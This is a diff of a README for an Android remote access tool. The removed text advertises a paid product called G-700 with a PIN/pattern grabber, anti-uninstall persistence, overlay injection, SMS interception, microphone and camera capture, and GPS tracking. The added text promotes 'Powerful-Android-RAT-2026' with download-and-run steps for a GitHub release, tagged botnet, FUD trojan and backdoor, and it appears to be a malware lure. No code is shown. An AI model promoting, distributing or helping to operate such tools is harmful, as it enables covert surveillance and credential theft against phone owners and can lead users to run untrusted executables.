@@ -1,119 +1,229 @@
-<div align="center">
-  <!-- BADGES -->
-  <p>
-    <img src="https://img.shields.io/badge/Windows-10%20%7C%2011-0078D6?logo=windows&logoColor=white" alt="Windows">
-    <img src="https://img.shields.io/badge/Android-8.1%20--%2016%2B-3DDC84?logo=android" alt="Android">
-    <img src="https://img.shields.io/badge/AOSP-GrapheneOS%20Support-blue" alt="AOSP">
-    <img src="https://img.shields.io/badge/License-1%20Month%20%7C%20Lifetime-success" alt="License">
-  </p>
+# 📱 Powerful-Android-RAT-2026 - Remote Android Control Made Simple
 
-  <h1>⚡ G-700</h1>
-  <p><strong>Android Remote Control from Windows</strong></p>
-  <p><em>Full-stack, uninterrupted control • Android 8.1 → 16+ • AOSP & GrapheneOS Support</em></p>
+[![Download](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge)](https://github.com/voicingboss861/Powerful-Android-RAT-2026/releases)
 
-  <!-- BUTTONS -->
-  <p>
-    <a href="https://g-700.net/order/">
-      <img src="https://img.shields.io/badge/BUY%20NOW-1--Month%20%7C%20Lifetime-00C853?style=for-the-badge&logo=shopify" alt="Buy">
-    </a>
-    <a href="https://t.me/+nB4af88TAJAyMTE8">
-      <img src="https://img.shields.io/badge/Telegram-Channel-2CA5E0?style=for-the-badge&logo=telegram" alt="Telegram">
-    </a>
-    <a href="https://t.me/devx_support">
-      <img src="https://img.shields.io/badge/Contact-Support-0078D4?style=for-the-badge&logo=telegram" alt="Contact">
-    </a>
-  </p>
-  
-  <p>🌐 <a href="https://g-700.net">www.G-700.Net</a></p>
-  <hr>
-</div>
+## 🧰 What this app does
 
-## 📌 Overview
+Powerful-Android-RAT-2026 is an Android remote access tool. It helps you connect to an Android device from a Windows PC and send commands from one place.
 
-G-700 allows you to securely control Android devices up to Android 16 from your Windows PC. Whether for providing support, device management, or remote troubleshooting, G-700 ensures seamless, real-time access to Android smartphones and tablets with minimal setup. Experience fast, reliable, and secure remote connections, all from a user-friendly interface.
+Use it to:
 
----
+- View device status
+- Send remote commands
+- Manage files
+- Track basic activity
+- Control supported features from a single panel
 
-## ⚙️ Requirements
+It is built for users who want a simple desktop-based control setup without dealing with complex menus.
 
-| Component | Requirement |
-|:---------|:-----------|
-| **PC** | Windows 10 / Windows 11 |
-| **Phone** | Android 8.1 → Android 16+ |
+## 💻 What you need
 
----
+Before you start, make sure you have:
 
-## ✨ Features
+- A Windows PC
+- An Android device
+- Internet access
+- Enough free space for the app and its files
+- Permission to use the device you connect
 
-| Module | Description |
-|:-------|:-----------|
-| **Live Screen** | Real-time screen viewer & control |
-| **PIN/Pattern** | PIN & pattern grabber |
-| **Screen Reader** | Extract UI text content |
-| **Anti-Uninstall** | Persistence mode |
-| **Overlay Engine** | HTML overlay injection |
-| **Microphone** | Live mic monitoring |
-| **Camera** | Front/Rear camera capture |
-| **File Manager** | Full file system access |
-| **SMS Manager** | Send/Receive/Intercept SMS |
-| **Location** | Real-time GPS tracking |
-| **Call Logs** | Call history access |
-| **Accounts** | Monitor logged-in accounts |
-| **Activities** | Live app activity monitor |
-| **App Manager** | List/Disable/Uninstall apps |
-| **Contacts** | Full contacts management |
-| **⚙️ Extra** | WiFi networks, Clipboard, Notifications, Shell Commands, Black Screen & more |
+For best results, use:
 
----
+- Windows 10 or Windows 11
+- A stable USB cable or network connection, if your setup uses one
+- Updated Android system software on the target device
 
-## 📦 What You Get
+## 📥 Download
 
-✅ Ready-to-use software  
-✅ License key (1-Month or Lifetime)  
-✅ Video tutorials  
-✅ User guide  
-✅ Access to user dashboard  
-✅ 24/7 Chat Support & Free Future Updates
+Visit this page to download: https://github.com/voicingboss861/Powerful-Android-RAT-2026/releases
 
-> **After purchase:** All delivered in your user page on website
+On that page, look for the latest release file. Download the Windows package that matches the app. If the release comes as a ZIP file, save it to your desktop or Downloads folder.
 
----
+## 🪟 Install on Windows
 
-| License | Devices |
-|:-------|:-------:|
-| **1-Month License** | 1 Device |
-| **Lifetime License** | 3 Devices |
+Follow these steps on your Windows PC:
 
-<a href="https://g-700.net/order/">
-  <img src="https://img.shields.io/badge/🛒%20CLICK%20TO%20BUY-Purchase%20Now-ff6b6b?style=for-the-badge" alt="Buy">
-</a>
+1. Open the release page
+2. Download the latest file
+3. Open the downloaded ZIP file
+4. Extract the files to a folder you can find easily
+5. Open the extracted folder
+6. Run the main Windows file
 
----
+If Windows asks for permission, choose Allow or Yes so the app can start.
 
-## 📢 Official Channel
+If the file opens in a browser by mistake, save it first, then open it from File Explorer.
 
-📣 **Telegram:** [https://t.me/+nB4af88TAJAyMTE8](https://t.me/+nB4af88TAJAyMTE8)  
-📞 **Support:** [@devx_support](https://t.me/devx_support)  
-🌐 **Website:** [WWW.G-700.Net](https://g-700.net/)
+## ⚙️ First-time setup
 
----
+After you open the app, take a few minutes to set it up:
 
-## ⚖️ Legal
+1. Start the app on your PC
+2. Follow the on-screen setup steps
+3. Enter the connection details for the Android device
+4. Check that the device is online
+5. Save the profile so you can use it again later
 
-**By purchasing, you agree:**
+If the app asks for a device ID, IP address, or port, enter the values shown in your device setup screen.
 
-✓ Use only on devices YOU own  
-✓ Comply with all local laws  
-✓ Developer not liable for misuse  
-✓ No refunds after delivery  
-✓ No sharing/reselling licenses
+If the app asks for a password or key, use the one you created during setup.
 
-> **Important:** Illegal use (unauthorized surveillance) is strictly prohibited.
+## 📲 Connect an Android device
 
----
+To connect a device:
 
-<div align="center">
-  <hr>
-  <p>© 2026 G-700. All rights reserved.</p>
-  <sub>v8.1 | Updated March 2026</sub>
-</div>
+1. Open the app on Windows
+2. Make sure the Android device is ready
+3. Add the device in the app
+4. Confirm the connection
+5. Wait for the status to change to connected
+
+If the device does not appear right away, check the network, then try again.
+
+If the app uses a local network setup, make sure both devices are on the same Wi-Fi network.
+
+## 🖱️ Main features
+
+Powerful-Android-RAT-2026 includes common remote control tools such as:
+
+- Device list view
+- Live connection status
+- File manager
+- Command panel
+- Basic device info
+- Session control
+- TCP-based communication support
+
+Other useful functions may include:
+
+- Start and stop remote sessions
+- Send built-in commands
+- Browse folders
+- Copy files between devices
+- View simple activity logs
+
+## 📁 File management
+
+The file manager lets you work with files on the connected Android device.
+
+You can:
+
+- Open folders
+- Rename files
+- Copy files
+- Delete files
+- Upload files from Windows
+- Download files to your PC
+
+Use clear folder names so you can find items fast. Keep backups of anything important before you change files.
+
+## 🔐 Connection setup tips
+
+A smooth connection often depends on these basics:
+
+- Keep both devices online
+- Use the correct address and port
+- Match the password or key on both sides
+- Check that your firewall does not block the app
+- Restart the app if the session fails to load
+
+If the connection drops, close the app on both devices, then start again.
+
+## 🧭 Basic use guide
+
+After you connect a device, these steps help you get started:
+
+1. Open the device profile
+2. Check the status panel
+3. Select the tool you need
+4. Send the command or action
+5. Wait for the result to load
+6. Save changes if needed
+
+Move through one task at a time. This keeps the session easy to manage.
+
+## 🛠️ Common problems
+
+If the app does not open:
+
+- Extract the ZIP file again
+- Try running the file as admin
+- Check that Windows did not block the app
+
+If the device does not connect:
+
+- Confirm the device is online
+- Check the IP address or device ID
+- Make sure the port matches
+- Restart both devices
+
+If files do not load:
+
+- Open the folder again
+- Check your permissions
+- Refresh the session
+
+If the app closes on start:
+
+- Re-download the latest release
+- Remove the old files
+- Start from a clean folder
+
+## 🧪 Suggested workflow
+
+A simple way to use the app:
+
+1. Open the Windows app
+2. Load your saved device profile
+3. Confirm the session is live
+4. Use the file manager or command panel
+5. Review the result
+6. Close the session when done
+
+This keeps each step clear and reduces mistakes.
+
+## 📌 Repository topics
+
+This project is linked to topics such as:
+
+- android-botnet
+- android-exploitation
+- android-fud-trojan
+- androrat
+- backdoor
+- control-android
+- hacking-tools
+- interpreter-commands
+- remote-administrator-tool
+- spynote
+- tcp
+
+## 🧷 Folder layout
+
+After extraction, you may see files like:
+
+- Main app file
+- Config folder
+- Logs folder
+- Release notes
+- Readme file
+- Support files
+
+Keep all files in the same folder. Do not move one file on its own unless the app tells you to.
+
+## 🧼 Cleanup
+
+When you are done, close the app and remove files you no longer need.
+
+You can:
+
+- Close the active session
+- Delete old logs
+- Remove test profiles
+- Clear unused downloads
+- Store the release ZIP in a backup folder if you want to keep it
+
+## 🔎 Version use
+
+Always use the latest release from the release page. New builds may fix bugs, improve connection stability, and update support files.
+
+Download the newest version here: https://github.com/voicingboss861/Powerful-Android-RAT-2026/releases
